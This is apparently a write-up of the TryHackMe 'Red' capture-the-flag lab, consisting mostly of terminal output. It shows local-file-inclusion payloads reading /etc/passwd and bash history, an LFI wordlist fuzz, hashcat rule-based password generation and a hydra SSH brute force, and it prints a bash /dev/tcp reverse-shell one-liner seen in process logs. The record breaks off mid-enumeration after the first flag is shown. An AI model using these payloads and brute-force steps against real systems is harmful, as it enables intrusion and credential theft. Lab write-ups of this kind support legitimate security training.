----
A classic battle for the ages.
----

![](https://tryhackme-images.s3.amazonaws.com/room-icons/02262ebcc025ce939f26d08836df0fca.png)

### Task 1  What are the flags?

 Start Machine

The match has started, and Red has taken the lead on you.  
But you are Blue, and only you can take Red down.  
  
However, Red has implemented some defense mechanisms that will make the battle a bit difficult:  
1. Red has been known to kick adversaries out of the machine. Is there a way around it?  
2. Red likes to change adversaries' passwords but tends to keep them relatively the same.   
3. Red likes to taunt adversaries in order to throw off their focus. Keep your mind sharp!  
  
This is a unique battle, and if you feel up to the challenge. Then by all means go for it!

Whenever you are ready, click on the **Start Machine** button to fire up the Virtual Machine.

Answer the questions below

```
┌──(witty㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.60.213 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.60.213:22
Open 10.10.60.213:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-14 15:41 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 15:41
Completed NSE at 15:41, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 15:41
Completed NSE at 15:41, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 15:41
Completed NSE at 15:41, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 15:41
Completed Parallel DNS resolution of 1 host. at 15:41, 0.01s elapsed
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 15:41
Scanning 10.10.60.213 [2 ports]
Discovered open port 22/tcp on 10.10.60.213
Discovered open port 80/tcp on 10.10.60.213
Completed Connect Scan at 15:41, 0.19s elapsed (2 total ports)
Initiating Service scan at 15:41
Scanning 2 services on 10.10.60.213
Completed Service scan at 15:41, 6.40s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.60.213.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 15:41
Completed NSE at 15:41, 5.54s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 15:41
Completed NSE at 15:41, 0.74s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 15:41
Completed NSE at 15:41, 0.00s elapsed
Nmap scan report for 10.10.60.213
Host is up, received user-set (0.19s latency).
Scanned at 2023-07-14 15:41:14 EDT for 13s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e2741ce0f7864d6946f65b4dbec39f76 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC1MTQvnXh8VLRlrK8tXP9JEHtHpU13E7cBXa1XFM/TZrXXpffMfJneLQvTtSQcXRUSvq3Z3fHLk4xhM1BEDl+XhlRdt+bHIP4O5Myk8qLX9E1FFpcy3NrEHJhxCCY/SdqrK2ZXyoeld1Ww+uHpP5UBPUQQZNypxYWDNB5K0tbDRU+Hw+p3H3BecZwue1J2bITy6+Y9MdgJKKaVBQXHCpLTOv3A7uznCK6gLEnqHvGoejKgFXsWk8i5LJxJqsHtQ4b+AaLS9QAy3v9EbhSyxAp7Zgcz0t7GFRgc4A5LBFZL0lUc3s++AXVG0hJ9cdVTBl282N1/hF8PG4T6JjhOVX955sEBDER4T6FcCPehqzCrX0cEeKX6y6hZSKnT4ps9kaazx9O4slrraF83O9iooBTtvZ7iGwZKiCwYFOofaIMv+IPuAJJuRT0156NAl6/iSHyUM3vD3AHU8k7OISBkndyAlvYcN/ONGWn4+K/XKxkoXOCW1xk5+0sxdLfMYLk2Vt8=
|   256 fb8473da6cfeb9195a6c654dd1723bb0 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDooZFwx0zdNTNOdTPWqi+z2978Kmd6db0XpL5WDGB9BwKvTYTpweK/dt9UvcprM5zMllXuSs67lPNS53h5jlIE=
|   256 5e3775fcb364e2d8d6bc9ae67e604d3c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDyWZoVknPK7ItXpqVlgsise5Vaz2N5hstWzoIZfoVDt
80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-title: Atlanta - Free business bootstrap template
|_Requested resource was /index.php?page=home.html
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 15:41
Completed NSE at 15:41, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 15:41
Completed NSE at 15:41, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 15:41
Completed NSE at 15:41, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.66 seconds

┌──(witty㉿kali)-[~/Downloads]
└─$ arjun -u http://10.10.60.213
    _
   /_| _ '
  (  |/ /(//) v2.2.1
      _/      

[*] Probing the target for stability
[*] Analysing HTTP response for anomalies
[*] Analysing HTTP response for potential parameter names
[*] Logicforcing the URL endpoint
[✓] parameter detected: page, based on: http code
[+] Parameters found: page

uhmm after lot of enumeration

Issue detail
The page parameter is vulnerable to path traversal attacks, enabling read access to arbitrary files on the server.  The payload file:///etc/passwd was submitted in the page parameter. The requested file was returned in the application's response. 

http://10.10.124.199/index.php?page=file:///etc/passwd

root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin pollinate:x:110:1::/var/cache/pollinate:/bin/false usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin sshd:x:112:65534::/run/sshd:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin blue:x:1000:1000:blue:/home/blue:/bin/bash lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false red:x:1001:1001::/home/red:/bin/bash 

http://10.10.124.199/index.php?page=file:///etc/hosts

127.0.0.1 localhost 127.0.1.1 red 192.168.0.1 redrules.thm # The following lines are desirable for IPv6 capable hosts ::1 ip6-localhost ip6-loopback fe00::0 ip6-localnet ff00::0 ip6-mcastprefix ff02::1 ip6-allnodes ff02::2 ip6-allrouter 

http://10.10.124.199/index.php?page=file:///etc/hostname

red

http://10.10.124.199/index.php?page=file:///etc/crontab

# /etc/crontab: system-wide crontab # Unlike any other crontab you don't have to run the `crontab' # command to install the new version when you edit this file # and files in /etc/cron.d. These files also have username fields, # that none of the other crontabs do. SHELL=/bin/sh PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin # Example of job definition: # .---------------- minute (0 - 59) # | .------------- hour (0 - 23) # | | .---------- day of month (1 - 31) # | | | .------- month (1 - 12) OR jan,feb,mar,apr ... # | | | | .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat # | | | | | # * * * * * user-name command to be executed 17 * * * * root cd / && run-parts --report /etc/cron.hourly 25 6 * * * root test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily ) 47 6 * * 7 root test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly ) 52 6 1 * * root test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly ) # 

http://10.10.124.199/index.php?page=file:///etc/os-release

NAME="Ubuntu" VERSION="20.04.4 LTS (Focal Fossa)" ID=ubuntu ID_LIKE=debian PRETTY_NAME="Ubuntu 20.04.4 LTS" VERSION_ID="20.04" HOME_URL="https://www.ubuntu.com/" SUPPORT_URL="https://help.ubuntu.com/" BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/" PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy" VERSION_CODENAME=focal UBUNTU_CODENAME=focal 

http://10.10.124.199/index.php?page=php://filter/convert.base64-encode/resource=index.php

PD9waHAgCgpmdW5jdGlvbiBzYW5pdGl6ZV9pbnB1dCgkcGFyYW0pIHsKICAgICRwYXJhbTEgPSBzdHJfcmVwbGFjZSgiLi4vIiwiIiwkcGFyYW0pOwogICAgJHBhcmFtMiA9IHN0cl9yZXBsYWNlKCIuLyIsIiIsJHBhcmFtMSk7CiAgICByZXR1cm4gJHBhcmFtMjsKfQoKJHBhZ2UgPSAkX0dFVFsncGFnZSddOwppZiAoaXNzZXQoJHBhZ2UpICYmIHByZWdfbWF0Y2goIi9eW2Etel0vIiwgJHBhZ2UpKSB7CiAgICAkcGFnZSA9IHNhbml0aXplX2lucHV0KCRwYWdlKTsKICAgIHJlYWRmaWxlKCRwYWdlKTsKfSBlbHNlIHsKICAgIGhlYWRlcignTG9jYXRpb246IC9pbmRleC5waHA/cGFnZT1ob21lLmh0bWwnKTsKfQoKPz4K

<?php 

function sanitize_input($param) {
    $param1 = str_replace("../","",$param);
    $param2 = str_replace("./","",$param1);
    return $param2;
}

$page = $_GET['page'];
if (isset($page) && preg_match("/^[a-z]/", $page)) {
    $page = sanitize_input($page);
    readfile($page);
} else {
    header('Location: /index.php?page=home.html');
}

?>

┌──(witty㉿kali)-[~/Downloads]
└─$ ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u "http://10.10.124.199/index.php?page=file:///FUZZ" -fs 0

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.124.199/index.php?page=file:///FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 0
________________________________________________

[Status: 200, Size: 7224, Words: 942, Lines: 228, Duration: 219ms]
    * FUZZ: /etc/apache2/apache2.conf

[Status: 200, Size: 1858, Words: 16, Lines: 36, Duration: 2297ms]
    * FUZZ: ..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd

[Status: 200, Size: 2777, Words: 281, Lines: 50, Duration: 506ms]
    * FUZZ: /etc/apt/sources.list

[Status: 200, Size: 658, Words: 77, Lines: 13, Duration: 506ms]
    * FUZZ: /etc/fstab

[Status: 200, Size: 779, Words: 1, Lines: 60, Duration: 214ms]
    * FUZZ: /etc/group

[Status: 200, Size: 1858, Words: 16, Lines: 36, Duration: 2911ms]
    * FUZZ: /%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd

[Status: 200, Size: 242, Words: 23, Lines: 11, Duration: 190ms]
    * FUZZ: ../../../../../../../../../../../../etc/hosts

[Status: 200, Size: 242, Words: 23, Lines: 11, Duration: 190ms]
    * FUZZ: /etc/hosts

[Status: 200, Size: 711, Words: 128, Lines: 18, Duration: 188ms]
    * FUZZ: /etc/hosts.deny

[Status: 200, Size: 411, Words: 82, Lines: 11, Duration: 188ms]
    * FUZZ: /etc/hosts.allow

[Status: 200, Size: 8181, Words: 1500, Lines: 356, Duration: 187ms]
    * FUZZ: /etc/init.d/apache2

[Status: 200, Size: 26, Words: 5, Lines: 3, Duration: 191ms]
    * FUZZ: /etc/issue

[Status: 200, Size: 510, Words: 131, Lines: 21, Duration: 191ms]
    * FUZZ: /etc/nsswitch.conf

[Status: 200, Size: 1858, Words: 16, Lines: 36, Duration: 190ms]
    * FUZZ: /./././././././././././etc/passwd

[Status: 200, Size: 1858, Words: 16, Lines: 36, Duration: 187ms]
    * FUZZ: ../../../../../../../../../../../../../../../../../../../../etc/passwd

[Status: 200, Size: 1858, Words: 16, Lines: 36, Duration: 188ms]
    * FUZZ: /etc/passwd

[Status: 200, Size: 1858, Words: 16, Lines: 36, Duration: 189ms]
    * FUZZ: /../../../../../../../../../../etc/passwd

[Status: 200, Size: 1858, Words: 16, Lines: 36, Duration: 187ms]
    * FUZZ: ../../../../../../../../../../../../../../../../../../../../../etc/passwd

[Status: 200, Size: 1858, Words: 16, Lines: 36, Duration: 187ms]
    * FUZZ: ../../../../../../../../../../../../../../../../../../../../../../etc/passwd

[Status: 200, Size: 1858, Words: 16, Lines: 36, Duration: 189ms]
    * FUZZ: ../../../../../../../../../../../../../../../../../../../etc/passwd

[Status: 200, Size: 1858, Words: 16, Lines: 36, Duration: 3917ms]
    * FUZZ: ..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd

[Status: 200, Size: 1858, Words: 16, Lines: 36, Duration: 189ms]
    * FUZZ: ../../../../../../../../../../../../../../../../etc/passwd

[Status: 200, Size: 1858, Words: 16, Lines: 36, Duration: 189ms]
    * FUZZ: ../../../../../../../../../../../../../../../../../../etc/passwd

[Status: 200, Size: 1858, Words: 16, Lines: 36, Duration: 190ms]
    * FUZZ: ../../../../../../../../../../../../../../../etc/passwd

[Status: 200, Size: 1858, Words: 16, Lines: 36, Duration: 189ms]
    * FUZZ: ../../../../../../../../../../../etc/passwd

[Status: 200, Size: 1858, Words: 16, Lines: 36, Duration: 189ms]
    * FUZZ: ../../../../../../../../../../../../etc/passwd

[Status: 200, Size: 1858, Words: 16, Lines: 36, Duration: 190ms]
    * FUZZ: ../../../../../../../../../../../../../etc/passwd

[Status: 200, Size: 1858, Words: 16, Lines: 36, Duration: 190ms]
    * FUZZ: ../../../../../../../../../../../../../../etc/passwd

[Status: 200, Size: 1858, Words: 16, Lines: 36, Duration: 188ms]
    * FUZZ: ../../../../../../../../../../etc/passwd

[Status: 200, Size: 1858, Words: 16, Lines: 36, Duration: 190ms]
    * FUZZ: ../../../../../../../../../../../../../../../../../etc/passwd

[Status: 200, Size: 1858, Words: 16, Lines: 36, Duration: 191ms]
    * FUZZ: ../../../../../../../../../etc/passwd

[Status: 200, Size: 1858, Words: 16, Lines: 36, Duration: 191ms]
    * FUZZ: ../../../../etc/passwd

[Status: 200, Size: 1858, Words: 16, Lines: 36, Duration: 191ms]
    * FUZZ: ../../../../../etc/passwd

[Status: 200, Size: 1858, Words: 16, Lines: 36, Duration: 192ms]
    * FUZZ: ../../../../../../etc/passwd

[Status: 200, Size: 1858, Words: 16, Lines: 36, Duration: 191ms]
    * FUZZ: ../../../etc/passwd

[Status: 200, Size: 1858, Words: 16, Lines: 36, Duration: 191ms]
    * FUZZ: ../../../../../../../../etc/passwd

[Status: 200, Size: 1858, Words: 16, Lines: 36, Duration: 191ms]
    * FUZZ: ../../../../../../../etc/passwd

[Status: 200, Size: 1858, Words: 16, Lines: 36, Duration: 189ms]
    * FUZZ: ../../etc/passwd

[Status: 200, Size: 1858, Words: 16, Lines: 36, Duration: 189ms]
    * FUZZ: ../etc/passwd

[Status: 200, Size: 1858, Words: 16, Lines: 36, Duration: 190ms]
    * FUZZ: etc/passwd

[Status: 200, Size: 1042, Words: 181, Lines: 23, Duration: 3141ms]
    * FUZZ: /etc/crontab

[Status: 200, Size: 751, Words: 99, Lines: 20, Duration: 188ms]
    * FUZZ: /etc/resolv.conf

[Status: 200, Size: 887, Words: 36, Lines: 41, Duration: 188ms]
    * FUZZ: /etc/rpc

[Status: 200, Size: 3336, Words: 297, Lines: 126, Duration: 189ms]
    * FUZZ: /etc/ssh/sshd_config

[Status: 200, Size: 2128, Words: 263, Lines: 57, Duration: 188ms]
    * FUZZ: /proc/cpuinfo

[Status: 200, Size: 1475, Words: 528, Lines: 54, Duration: 189ms]
    * FUZZ: /proc/meminfo

[Status: 200, Size: 27, Words: 5, Lines: 2, Duration: 189ms]
    * FUZZ: /proc/loadavg

[Status: 200, Size: 1910, Words: 872, Lines: 36, Duration: 189ms]
    * FUZZ: /proc/interrupts

[Status: 200, Size: 2903, Words: 201, Lines: 41, Duration: 189ms]
    * FUZZ: /proc/mounts

[Status: 200, Size: 156, Words: 79, Lines: 3, Duration: 186ms]
    * FUZZ: /proc/net/arp

[Status: 200, Size: 512, Words: 290, Lines: 5, Duration: 189ms]
    * FUZZ: /proc/net/route

[Status: 200, Size: 27, Words: 1, Lines: 1, Duration: 189ms]
    * FUZZ: /proc/self/cmdline

[Status: 200, Size: 353, Words: 165, Lines: 13, Duration: 189ms]
    * FUZZ: /proc/partitions

[Status: 200, Size: 8100, Words: 3017, Lines: 55, Duration: 192ms]
    * FUZZ: /proc/net/tcp

[Status: 200, Size: 449, Words: 239, Lines: 5, Duration: 197ms]
    * FUZZ: /proc/net/dev

[Status: 200, Size: 1313, Words: 92, Lines: 56, Duration: 189ms]
    * FUZZ: /proc/self/status

[Status: 200, Size: 153, Words: 17, Lines: 2, Duration: 189ms]
    * FUZZ: /proc/version

[Status: 200, Size: 1858, Words: 16, Lines: 36, Duration: 1696ms]
    * FUZZ: ../../../../../../etc/passwd&=%3C%3C%3C%3C

[Status: 200, Size: 41932, Words: 6540, Lines: 578, Duration: 190ms]
    * FUZZ: /var/log/dmesg

[Status: 200, Size: 292584, Words: 2, Lines: 1, Duration: 293ms]
    * FUZZ: /var/log/lastlog

[Status: 200, Size: 63744, Words: 4, Lines: 61, Duration: 589ms]
    * FUZZ: /var/log/wtmp

[Status: 200, Size: 1536, Words: 1, Lines: 1, Duration: 495ms]
    * FUZZ: /var/run/utmp

[Status: 200, Size: 1858, Words: 16, Lines: 36, Duration: 188ms]
    * FUZZ: ///////../../../etc/passwd

:: Progress: [922/922] :: Job [1/1] :: 211 req/sec :: Duration: [0:00:08] :: Errors: 0 ::


http://10.10.70.179/index.php?page=php://filter/resource=/etc/passwd

root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin pollinate:x:110:1::/var/cache/pollinate:/bin/false usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin sshd:x:112:65534::/run/sshd:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin blue:x:1000:1000:blue:/home/blue:/bin/bash lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false red:x:1001:1001::/home/red:/bin/bash 

3 users /home/syslog /home/blue /home/red

http://10.10.124.199/index.php?page=file:////home/blue/.bash_history

echo "Red rules" cd hashcat --stdout .reminder -r /usr/share/hashcat/rules/best64.rule > passlist.txt cat passlist.txt rm passlist.txt sudo apt-get remove hashcat -y 


https://sushant747.gitbooks.io/total-oscp-guide/content/local_file_inclusion.html

http://10.10.70.179/index.php?page=php://filter/resource=/home/blue/.reminder

sup3r_p@s$w0rd! 

┌──(witty㉿kali)-[~/Downloads]
└─$ cat .reminder  
sup3r_p@s$w0rd!

┌──(witty㉿kali)-[~/Downloads]
└─$ hashcat --stdout .reminder -r /usr/share/hashcat/rules/best64.rule > passlist_blue.txt
                                                                                                          
┌──(witty㉿kali)-[~/Downloads]
└─$ more passlist_blue.txt 
sup3r_p@s$w0rd!
!dr0w$s@p_r3pus
SUP3R_P@S$W0RD!
Sup3r_p@s$w0rd!
sup3r_p@s$w0rd!0
sup3r_p@s$w0rd!1
sup3r_p@s$w0rd!2
sup3r_p@s$w0rd!3

┌──(witty㉿kali)-[~/Downloads]
└─$ hydra -l blue -P passlist_blue.txt 10.10.70.179 ssh -t 64
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-07-15 17:48:10
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 64 tasks per 1 server, overall 64 tasks, 77 login tries (l:1/p:77), ~2 tries per task
[DATA] attacking ssh://10.10.70.179:22/
[22][ssh] host: 10.10.70.179   login: blue   password: sup3r_p@s$w0rd!

┌──(witty㉿kali)-[~/Downloads]
└─$ ssh blue@10.10.70.179                                    
The authenticity of host '10.10.70.179 (10.10.70.179)' can't be established.
ED25519 key fingerprint is SHA256:Jw5VYW4+TkPGUq5z4MEIujkfaV/jzH5rIHM6bxyug/Q.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.70.179' (ED25519) to the list of known hosts.
blue@10.10.70.179's password: 
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-124-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat 15 Jul 2023 09:49:03 PM UTC

  System load:  1.92              Processes:             128
  Usage of /:   60.9% of 8.87GB   Users logged in:       0
  Memory usage: 12%               IPv4 address for ens5: 10.10.70.179
  Swap usage:   0%

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

61 updates can be applied immediately.
6 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

6 updates could not be installed automatically. For more details,
see /var/log/unattended-upgrades/unattended-upgrades.log

Last login: Mon Apr 24 22:18:08 2023 from 10.13.4.71
blue@red:~$ id
uid=1000(blue) gid=1000(blue) groups=1000(blue)
blue@red:~$ ls
flag1
blue@red:~$ cat flag1
THM{Is_thAt_all_y0u_can_d0_blU3?}
blue@red:~$ cd /tmp
blue@red:/tmp$ wget http://10.8.19.103:1234/pspyThere is no way you are going to own this machine
Say Bye Bye to your Shell Blue and that password
Connection to 10.10.70.179 closed by remote host.
Connection to 10.10.70.179 closed.

┌──(witty㉿kali)-[~/Downloads]
└─$ hydra -l blue -P passlist_blue.txt 10.10.70.179 ssh -t 64
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-07-15 17:50:14
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 64 tasks per 1 server, overall 64 tasks, 77 login tries (l:1/p:77), ~2 tries per task
[DATA] attacking ssh://10.10.70.179:22/
[22][ssh] host: 10.10.70.179   login: blue   password: sup3r_p@s$w0sup3r_p@s$w0
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-07-15 17:50:24

┌──(witty㉿kali)-[~/Downloads]
└─$ python3 -m http.server 1234                   
Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
10.10.70.179 - - [15/Jul/2023 17:51:19] "GET /pspy64s HTTP/1.1" 200 -
10.10.70.179 - - [15/Jul/2023 17:51:42] "GET /pspy64 HTTP/1.1" 200 -


blue@red:/tmp$ wget http://10.8.19.103:1234/pspy64
--2023-07-15 21:51:43--  http://10.8.19.103:1234/pspy64
Connecting to 10.8.19.103:1234... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3104768 (3.0M) [application/octet-stream]
Saving to: ‘pspy64’

pspy64                     100%[======================================>]   2.96M  1.19MB/s    in 2.5s    

2023-07-15 21:51:46 (1.19 MB/s) - ‘pspy64’ saved [3104768/3104768]

blue@red:/tmp$ chmod +x pspy64 
blue@red:/tmp$ ./pspy64
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Roses are Red, but violets aren’t blue, They’re purple, you dope. Now go get a clue.
Roses are Red, but violets aren’t blue, They’re purple, you dope. Now go get a clue.
Draining file system events due to startup...
done
2023/07/15 21:52:11 CMD: UID=1001  PID=2066   | bash -c nohup bash -i >& /dev/tcp/redrules.thm/9001 0>&1 & 
2023/07/15 21:52:11 CMD: UID=1000  PID=2041   | ./pspy64 
2023/07/15 21:52:11 CMD: UID=1001  PID=2028   | bash -c nohup bash -i >& /dev/tcp/redrules.thm/9001 0>&1 & 
2023/07/15 21:52:11 CMD: UID=1000  PID=1999   | -bash 
2023/07/15 21:52:11 CMD: UID=1000  PID=1998   | sshd: blue@pts/0     
